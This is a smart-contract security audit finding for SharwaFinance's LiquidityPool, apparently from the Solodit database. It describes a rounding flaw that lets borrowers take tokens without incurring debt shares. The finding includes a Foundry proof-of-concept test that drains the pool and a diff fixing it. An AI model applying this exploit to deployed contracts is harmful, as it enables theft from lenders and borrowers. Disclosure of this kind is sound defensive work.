---
# Core Classification
protocol: Sharwafinance
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36474
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/SharwaFinance-security-review.md
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[C-03] Users can borrow tokens without generating debt shares

### Overview


This bug report is about a problem in the `borrow` function of the `LiquidityPool` contract. The function calculates the amount of debt shares to credit to a borrower, but there is an issue with the calculation that can be exploited by a malicious user. This allows the user to borrow tokens without generating any debt shares, draining the pool and causing losses for other borrowers. The report includes a proof of concept and a recommendation to fix the issue by rounding up the amount of debt shares instead of rounding down. 

### Original Finding Content

**Severity**

**Impact:** Medium

**Likelihood:** High

**Description**

The `borrow` function of the `LiquidityPool` contract calculates the amount of debt shares to credit to the borrower by multiplying the new amount borrowed by the total debt shares and dividing by the total amount borrowed (including interest).

```solidity
File: LiquidityPool.sol

142:         uint newDebtShare = borrows > 0
143:   @>        ? (debtSharesSum * amount) / borrows
144:             : (amount * 10 ** decimals()) / 10 ** poolToken.decimals();
```

In case the `debtShares * amount` is lower than `borrows`, the division will round down to 0 when `amount` is 1. This allows users to borrow tokens without generating debt shares.

A malicious user can borrow all the available tokens in the pool without generating any debt shares and withdraw them, draining the pool. Also, other borrowers in the pool will be credited with the debt of the attacker, so they can be liquidated and lose their collateral.

**Proof of concept**

```solidity
function test_debtSharesRoundDown() public {
    uint256 bobInitialWethBalance = WETH.balanceOf(address(bob));

    // Setup
    provideInitialLiquidity();
    vm.startPrank(alice);
    marginTrading.provideERC20(marginAccountID[alice], address(USDC), 10_000e6);
    marginTrading.provideERC20(marginAccountID[alice], address(WETH), 1e18);
    vm.stopPrank();
    vm.startPrank(bob);
    marginTrading.provideERC20(marginAccountID[bob], address(USDC), 10_000e6);
    marginTrading.borrow(marginAccountID[bob], address(WBTC), 100);
    vm.stopPrank();

    // Alice borrows 1 WETH
    vm.prank(alice);
    marginTrading.borrow(marginAccountID[alice], address(WETH), 1e18);

    // Interest accrues over time
    skip(10);

    // Bob borrows 1 wei and is credited 0 debt shares
    vm.prank(bob);
    marginTrading.borrow(marginAccountID[bob], address(WETH), 1);

    // Alice repays debt and interest
    vm.prank(alice);
    marginTrading.repay(marginAccountID[alice], address(WETH), 2e18);

    // Bob borrows huge amount of WETH and is credited 0 debt shares
    for (uint i = 0; i < 20; i++) {
        for (uint j = 0; j < 10; j++) {
            vm.prank(bob);
            marginTrading.borrow(marginAccountID[bob], address(WETH), 10 **i);
        }
    }

    // Bob withdraws all WETH
    uint256 bobAvailableWeth = marginAccount.getErc20ByContract(marginAccountID[bob], address(WETH));
    vm.prank(bob);
    marginTrading.withdrawERC20(marginAccountID[bob], address(WETH), bobAvailableWeth);

    uint256 bobWethProfit = WETH.balanceOf(address(bob)) - bobInitialWethBalance;
    assert(bobWethProfit == bobAvailableWeth);
    assert(bobWethProfit > 100e18);
}
```

**Recommendations**

Round up the amount of debt shares to the nearest integer in the `borrow` function.

```diff
+import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

/**
 * @title LiquidityPool
 * @dev This contract manages a liquidity pool for ERC20 tokens, allowing users to provide liquidity, borrow, and repay loans.
 * @notice Users can deposit tokens to earn interest and borrow against their deposits.
 * @author 0nika0
 */
contract LiquidityPool is ERC20, ERC20Burnable, AccessControl, ILiquidityPool, ReentrancyGuard {
+   using Math for uint;
(...)
        uint newDebtShare = borrows > 0
-           ? (debtSharesSum * amount) / borrows
+           ? debtSharesSum.mulDiv(amount, borrows, Math.Rounding.Up)
            : (amount * 10 ** decimals()) / 10 ** poolToken.decimals();
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Sharwafinance |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/SharwaFinance-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

